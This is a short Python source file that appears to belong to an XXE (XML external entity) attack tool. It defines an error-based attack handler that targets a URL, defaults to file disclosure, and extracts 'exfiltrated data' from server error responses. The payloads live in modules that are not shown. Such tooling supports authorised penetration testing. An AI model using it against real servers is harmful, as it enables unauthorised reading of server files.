from typing import Optional

from xeely.custom_http.server import HTTPServerParams
from xeely.custom_xml import XML
from xeely.xxe.attack.handler.abstract import AbstractXXEAttackHandler
from xeely.xxe.attack.mode import XXEAttackMode
from xeely.xxe.attack.payload.error import DTD_WRAPPER
from xeely.xxe.attack.type import XXEAttackType


class XXEDErrorAttackHandler(AbstractXXEAttackHandler):
    def __init__(
        self,
        resource: str,
        xml: XML,
        target_url: str,
        attack_type: XXEAttackType = XXEAttackType.FILE_DISCLOSURE,
        should_apply_base64_encoding: bool = False,
        should_use_cdata: bool = False,
        http_server_params: Optional[HTTPServerParams] = None,
    ):
        super().__init__(
            resource=resource,
            target_url=target_url,
            xml=xml,
            attack_type=attack_type,
            attack_mode=XXEAttackMode.ERROR,
            should_apply_base64_encoding=should_apply_base64_encoding,
            should_use_cdata=should_use_cdata,
            http_server_params=http_server_params,
        )

    def _get_exfiltrated_data(self, **kwargs) -> str:
        http_response: str = kwargs["http_response"]
        data = http_response.split(DTD_WRAPPER)

        if len(data) != 3:
            return ""

        return data[1]
